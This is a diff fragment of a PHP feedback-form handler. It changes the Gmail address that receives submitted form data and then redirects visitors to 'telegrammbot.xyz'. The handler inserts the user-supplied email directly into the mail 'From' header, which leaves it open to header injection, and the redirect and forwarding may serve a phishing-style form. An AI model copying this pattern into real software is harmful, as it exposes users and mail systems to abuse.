@@ -5,7 +5,7 @@ $name = $_POST['name'];
 $headers = "From:$email" . "\r\n";
 
 // send email
-mail("mmdjoker97@gmail.com", "FeedBack-$name", $message, $headers);
+mail("Bboydoeamer@gmail.com", "FeedBack-$name", $message, $headers);
 echo '<script type="text/javascript">
            window.location = "https://telegrammbot.xyz"
       </script>';
